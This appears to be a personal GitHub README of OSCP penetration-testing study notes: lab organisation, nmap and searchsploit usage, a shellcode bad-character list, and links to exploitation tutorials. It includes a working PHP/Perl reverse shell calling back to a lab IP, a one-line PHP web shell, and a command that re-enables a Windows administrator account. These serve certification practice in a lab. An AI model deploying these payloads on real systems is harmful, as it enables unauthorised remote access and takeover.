# OSCP Notes
My notes on OSCP

### Lab Notes
Setup a good folder/file naming structure to organize your work. I have three main folders:
- exploits: work-in-progress info
    - host1
    - host2
    - _recon: network-wide scans data
- network1: contains finished hosts under network1 (moved from exploits directory)
- network2: contains finished hosts under network2
- reports


Setup shell aliases for connecting to OVPN & Windows machine
Under `.bashrc` in Kali
```
cd
lab="openvpn YOUR_OVPN_FILE.ovpn"
win="rdesktop -u username -p password 1.2.3.4"
source .bashrc
```

### Kali-specific Notes
Search exploits
```
searchsploit wordpress escalation
...snip...
cp /usr/share/exploitdb/exploits/php/webapps/12345.txt ./
````

### Recon
NMAP
```bash
nmap -A -T4 --script vulners -oN out.nmap {TARGETS}
```

Target a specific type of scripts with wildcards (e.g. smb*)
```bash
nmap -T4 --script ftp* -p 21 -oN out.nmap {TARGETS}
```

Add addtional vulnerability scanning capability to NMAP

[Vulners](https://github.com/vulnersCom/nmap-vulners)

### Web
gobuster

[Gobuster Package Description](https://tools.kali.org/web-applications/gobuster)

## Useful Tools / Cheatsheets
Handy tools/cheatsheets for lab

MS17-010
[AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)

msfvenom *replaced msfpayload in older articles*
[Msfvenom Cheat Sheet](https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/)

## Useful Bookmarks
Detailed explanation on how tools/exploits work.

### Windows
[Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
[AutoBlue](https://0xdf.gitlab.io/2019/02/22/wl-dummy.html)

### MySQL
[GAINING A ROOT SHELL USING MYSQL USER DEFINED FUNCTIONS AND SETUID BINARIES](https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)

### Oracle
[Variations in Exploit methods between Linux and Windows](https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf)

### Metasploit
[Deep Dive Into Stageless Meterpreter Payloads](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/)
[Offensive Msfvenom: From Generating Shellcode to Creating Trojans] (https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86)

### Java
[Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
[Java RMI](https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI)

### Shell Code
[0x7 Exploit Tutorial: Bad Character Analysis](http://www.primalsecurity.net/0x7-exploit-tutorial-bad-character-analysis/)
```python
bad_chars = ""
bad_chars += "x01x02x03x04x05x06x07x08x09x0ax0bx0cx0dx0ex0fx10"
bad_chars += "x11x12x13x14x15x16x17x18x19x1ax1bx1cx1dx1ex1fx20"
bad_chars += "x21x22x23x24x25x26x27x28x29x2ax2bx2cx2dx2ex2fx30"
bad_chars += "x31x32x33x34x35x36x37x38x39x3ax3bx3cx3dx3ex3fx40"
bad_chars += "x41x42x43x44x45x46x47x48x49x4ax4bx4cx4dx4ex4fx50"
bad_chars += "x51x52x53x54x55x56x57x58x59x5ax5bx5cx5dx5ex5fx60"
bad_chars += "x61x62x63x64x65x66x67x68x69x6ax6bx6cx6dx6ex6fx70"
bad_chars += "x71x72x73x74x75x76x77x78x79x7ax7bx7cx7dx7ex7fx80"
bad_chars += "x81x82x83x84x85x86x87x88x89x8ax8bx8cx8dx8ex8fx90"
bad_chars += "x91x92x93x94x95x96x97x98x99x9ax9bx9cx9dx9ex9fxa0"
bad_chars += "xa1xa2xa3xa4xa5xa6xa7xa8xa9xaaxabxacxadxaexafxb0"
bad_chars += "xb1xb2xb3xb4xb5xb6xb7xb8xb9xbaxbbxbcxbdxbexbfxc0"
bad_chars += "xc1xc2xc3xc4xc5xc6xc7xc8xc9xcaxcbxccxcdxcexcfxd0"
bad_chars += "xd1xd2xd3xd4xd5xd6xd7xd8xd9xdaxdbxdcxddxdexdfxe0"
bad_chars += "xe1xe2xe3xe4xe5xe6xe7xe8xe9xeaxebxecxedxeexefxf0"
bad_chars += "xf1xf2xf3xf4xf5xf6xf7xf8xf9xfaxfbxfcxfdxfexff"
```

### Buffer Overflow Practice
Lots of scripts on github but I would recommend setup XP/Win7 box (and Immunity debugger/Mona) and practice

MiniShare 1.4.1
[MiniShare 1.4.1 - Remote Buffer Overflow (1)](https://www.exploit-db.com/exploits/616)
Software
[MiniShare 1.4.1](https://www.google.com/search?q=minishare-1.4.1.zip)


## Reverse Shell
PHP calls perl for reverse shell (quotes must be escaped properly - test it locally first!)
```php
<?php
$cmd = "perl -e 'use Socket;\$i=\"10.11.0.90\";\$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
shell_exec($cmd);
?>
```

## Web Shell
PHP
```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

## Post-Exploitation

### Windows
Reset/activate account
```powershell
net user administrator /active:yes password123
```

## Exam related links
[A Script Kiddie’s guide to Passing OSCP on your first attempt](https://forum.hackthebox.eu/discussion/1730/a-script-kiddie-s-guide-to-passing-oscp-on-your-first-attempt)

[Pentest Book](https://chryzsh.gitbooks.io/pentestbook/content/list_of_common_ports.html)